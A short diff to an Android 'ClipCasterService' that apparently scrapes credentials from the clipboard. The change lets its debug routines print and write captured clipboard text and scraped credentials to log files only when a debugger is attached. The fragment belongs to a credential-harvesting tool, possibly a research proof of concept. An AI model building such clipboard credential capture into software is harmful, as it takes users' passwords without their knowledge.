@@ -39,6 +39,7 @@ import android.content.ClipboardManager;
 import android.content.Context;
 import android.content.Intent;
 import android.os.Build;
+import android.os.Debug;
 import android.os.Handler;
 import android.os.IBinder;
 import android.text.Html;
@@ -171,13 +172,17 @@ public class ClipCasterService extends Service implements CredHandler{
     }
 
     private void onClipDebug(final String text){
-        System.out.println(text);
-        writeToFile(CLIPLOG_FILENAME, text);
+        if(Debug.isDebuggerConnected()) {
+            System.out.println(text);
+            writeToFile(CLIPLOG_FILENAME, text);
+        }
     }
 
     private void onCredDebug(final ClipParser.ScrapedCredentials credentials){
-        System.out.println(credentials.toString());
-        writeToFile(CREDLOG_FILENAME, credentials.toString());
+        if(Debug.isDebuggerConnected()) {
+            System.out.println(credentials.toString());
+            writeToFile(CREDLOG_FILENAME, credentials.toString());
+        }
     }
 
     private void writeToFile(String name, String text){
